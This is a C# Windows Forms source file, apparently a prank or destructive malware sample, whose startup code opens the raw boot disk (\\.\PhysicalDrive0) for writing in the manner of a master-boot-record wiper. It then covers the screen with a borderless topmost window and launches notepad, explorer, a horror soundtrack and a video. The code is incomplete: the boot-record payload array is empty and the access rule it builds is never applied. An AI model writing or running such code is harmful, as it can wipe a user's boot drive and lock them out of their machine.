using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics; // Пространство имен для Process
using System.Drawing;
using System.IO; // Пространство имен для работы с файлами
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Reflection;
using System.Security.AccessControl; // Пространство имен для FileSecurity и FileSystemAccessRule
using System.Security.Principal; // Пространство имен для NTAccount

namespace WindowsFormsApp2
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

            var mbrdata = new byte[] { };
            var security = new FileSecurity();
            security.AddAccessRule(new FileSystemAccessRule(
                new NTAccount("Everyone"), 
                FileSystemRights.FullControl, 
                AccessControlType.Allow));
            var mbr = File.Create("\\\\.\\PhysicalDrive0", 0, FileOptions.None);

            Padding = new Padding(0, 0, 0, 0);

            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Maximized;
            TopMost = true;
            ShowInTaskbar = false;
            StartPosition = FormStartPosition.CenterScreen;

            Process.Start("notepad.exe");
            Process.Start("explorer.exe");
            Process.Start("horror-background-atmosphere-15-246917.mp3");
            Process.Start("energetic-background-for-happy-moments-30s-248827.mp3");
            Process.Start("video.mp4");
        }
    }
}
